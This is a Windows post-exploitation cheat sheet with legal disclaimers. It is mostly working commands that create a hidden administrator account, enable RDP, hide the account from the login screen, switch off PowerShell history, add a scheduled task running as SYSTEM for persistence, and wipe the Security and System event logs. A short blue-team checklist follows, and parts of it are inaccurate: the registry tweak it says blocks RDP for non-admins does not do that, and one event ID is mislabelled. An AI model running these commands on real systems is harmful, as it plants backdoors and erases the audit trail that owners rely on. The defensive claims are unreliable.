# Windows Post-Exploitation Cheat Sheet

> **âš ï¸ Legal & Ethical Notice**  
> These techniques are for **authorized penetration testing and red team engagements only**.  
> Unauthorized use is illegal. Always obtain proper permissions before testing.

---

## ðŸ” User Creation & Privilege Escalation

### Create Hidden Local User
```cmd
net user joker P@$$w0rd! /add /comment:"System Backup Account" /fullname:"System Backup" /passwordchg:no
```

- `/passwordchg:no`: Prevents password expiration
- `/comment`: Adds decoy description for evasion
- **Verify**: `net user joker`

### Elevate to Administrator
```cmd
net localgroup administrators joker /add
```

**Verify**:
```cmd
net localgroup administrators | findstr /i joker
```

### Grant RDP Access
```cmd
net localgroup "Remote Desktop Users" joker /add
```

**Verify**:
```cmd
net localgroup "Remote Desktop Users" | findstr /i joker
```

---

## ðŸ–¥ï¸ Remote Desktop Protocol (RDP) Setup

### Start RDP Service Immediately
```cmd
net start TermService
```

### Verify Service Status
```cmd
sc query TermService | findstr "STATE"
```

**Alternative**:
```cmd
tasklist /svc | findstr /i TermService
```

### Enable Auto-Start on Boot
```cmd
sc config TermService start= auto
```

**Confirm**:
```cmd
sc qc TermService | findstr "START_TYPE"
```

### Allow Connections via Registry
```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

- Reboot required for registry changes
- **Bypass reboot (temporary enable)**:
  ```cmd
  net stop TermService && net start TermService
  ```

---

## ðŸ” Detection Avoidance & Cleanup

### Obfuscate User Activity
```cmd
net user joker /comment:"Legacy System Account" /fullname:"Legacy User"
```
*Change account description post-creation*

### Clear Command History
```cmd
doskey /reinstall
```

**PowerShell Alternative**:
```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

### Registry Stealth Modifications
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v joker /t REG_DWORD /d 0 /f
```
*Hides user from login screen (Windows 10/11)*

---

## ðŸ›¡ï¸ Blue Team Detection Checklist

### Critical Windows Events to Monitor

| Event ID | Description | Trigger Action |
|----------|-------------|----------------|
| 4720 | User account created | `net user /add` |
| 4732 | Added to privileged group | `net localgroup administrators` |
| 4624 | Successful RDP login | Terminal Services activity |
| 7045 | Service configuration change | `sc config TermService` |
| 4697 | Service installation | Service binary modification |

### Defense Recommendations

1. **Enable auditing** for Account Management events

2. **Monitor registry changes** to:
   - `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`
   - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

3. **Restrict RDP access**:
   ```powershell
   # Block RDP for non-admin users
   Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "UserAuthentication" -Value 1
   ```

4. **Implement LAPS** for local admin password management

---

## ðŸ’¡ Pro Tips

### Password Strategy
- Use `P@$$w0rd!` instead of `password123` to bypass weak password checks

### RDP Alternatives
When RDP is blocked, use **PowerShell Remoting**:
```powershell
Enter-PSSession -ComputerName target -Credential (Get-Credential)
```

### Persistence Technique
Create scheduled task for user maintenance:
```cmd
schtasks /create /tn "SystemUpdate" /tr "net user joker P@$$w0rd!" /sc daily /ru SYSTEM
```

### Cleanup Protocol
- Always remove tools, logs, and temporary files after engagement
- Clear event logs if possible:
  ```cmd
  wevtutil cl Security
  wevtutil cl System
  ```

---

## ðŸ“‹ Quick Reference Commands

### Essential Verification Commands
```cmd
# Check current user privileges
whoami /priv

# List all local users
net user

# Check RDP status
netstat -an | findstr :3389

# View active sessions
quser
```

### Emergency Cleanup
```cmd
# Remove created user
net user joker /delete

# Stop RDP service
net stop TermService

# Disable RDP via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

---

> **Disclaimer**: This cheat sheet is provided for educational and authorized testing purposes only. The author assumes no responsibility for misuse of this information.
```